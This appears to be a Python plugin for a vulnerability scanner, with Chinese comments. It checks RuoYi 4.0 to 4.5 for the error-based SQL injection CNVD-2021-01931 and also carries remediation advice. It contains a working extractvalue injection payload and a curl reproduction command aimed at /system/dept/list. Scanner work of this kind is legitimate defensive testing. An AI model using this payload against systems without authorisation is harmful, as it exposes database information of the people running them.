# SQL 报错注入（dept）：/system/dept/list 的 params[dataScope] 参数 extractvalue 报错注入
from core.http import host_of, join_url
from core.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from lib.colors import no, ok
from plugins.base import PluginBase


class SqlInjectDeptPlugin(PluginBase):
    name = "POST型报错注入（dept）"
    cve = "CNVD-2021-01931"
    severity = "high"
    category = "vuln"
    description = "/system/dept/list 的 params[dataScope] 参数拼接 extractvalue 报错注入，泄露 database()"
    fix = "对 dataScope 参数做白名单校验，禁止拼接 SQL，使用参数化查询"
    # D18：修复详情（具体代码 diff + 升级版本）
    fix_detail = (
        "【升级方案】升级 RuoYi 至 4.6.0+（该版本已修复 params[dataScope] 注入）\n"
        "  git pull https://gitee.com/y_project/RuoYi.git\n"
        "  mvn clean package -Pprod\n"
        "【代码修复】修改 SysDeptMapper.xml，对 dataScope 参数做白名单校验：\n"
        "  - 修改前：${params.dataScope}（直接拼接）\n"
        '  - 修改后：使用 DataScopeUtil.checkDataScope(params.get("dataScope")) 白名单校验\n'
        "【配置加固】在 application.yml 中启用 MyBatis 参数化：\n"
        "  mybatis.configuration.safe-result-handler-enabled: true\n"
        "【WAF 规则】拦截包含 extractvalue/updatexml/concat 的 dataScope 参数\n"
        "【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 输入校验"
    )
    # D24：复现命令（curl）
    reproduce = (
        'curl -X POST "http://target/system/dept/list" \\\n'
        '  -H "Content-Type: application/x-www-form-urlencoded" \\\n'
        '  -H "Accept: application/json" \\\n'
        "  -d 'params[dataScope]=and extractvalue(1, concat(0x7e,(select database()),0x7e))' \\\n"
        '  --cookie ""\n'
        "\n"
        '# 预期响应：HTTP 500 + 响应体含 "运行时异常" 或 "database()" 报错特征'
    )
    # D2：params[dataScope] 注入在 4.6.0 已修复
    affected_versions = ">=4.0,<4.6"
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
    compliance = "等保2.0:8.1.3;OWASP:A03:2021"
    # D7: WAF 绕过支持
    vuln_type = "sqli"
    supports_waf_bypass = True

    def verify(self, target, session):
        host = host_of(target)
        # 原 headers 1:1 保留（含 sec-ch-ua / Sec-Fetch-* / 空 Cookie 等）
        headers = {
            "Host": host,
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Upgrade-Insecure-Requests": "1",
            "sec-ch-ua": "Chromium;v=122, Not(A:Brand;v=24, Google Chrome;v=122",
            # 关键：使用 close 而非 keep-alive。SessionManager 复用 keep-alive 连接时，
            # 该请求在复用连接上偶发返回 500 空响应体，导致 database() 判定失败（false negative）。
            "Connection": "close",
            "Sec-Fetch-Dest": "document",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
            "Cookie": "",
            "sec-ch-ua-mobile": "?0",
            "Sec-Fetch-User": "?1",
            "sec-ch-ua-platform": "Windows",
            # 关键：必须是 application/json 而非 text/html。SQL 报错时若 Accept 为 text/html，
            # Spring Boot 会尝试渲染 HTML 错误视图而失败（返回 500 空响应体），导致 database()
            # 判定失效（false negative）。application/json 让错误以 JSON 返回并含 database() 特征。
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Encoding": "gzip, deflate, br",
        }
        # 原 data 1:1 保留（含 extractvalue payload，注意此处的空格差异与原脚本一致）
        data = {"params[dataScope]": "and extractvalue(1, concat(0x7e,(select database()),0x7e))"}
        url = join_url(target, "/system/dept/list")
        try:
            resp = session.post(url, headers=headers, data=data)
            sql_inject = resp.text
        except Exception as e:
            print(no("第二种POST型报错注入（网络异常）"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))
        # 判定 1:1 保留：'运行时异常' in t or 'database()' in t
        if "运行时异常" in sql_inject or "database()" in sql_inject:
            print(ok("存在第二种POST型报错注入"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence="响应含 运行时异常 或 database() 报错特征",
                fix=self.fix,
            )
        else:
            print(no("不存在其他POST型报错注入"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=url)
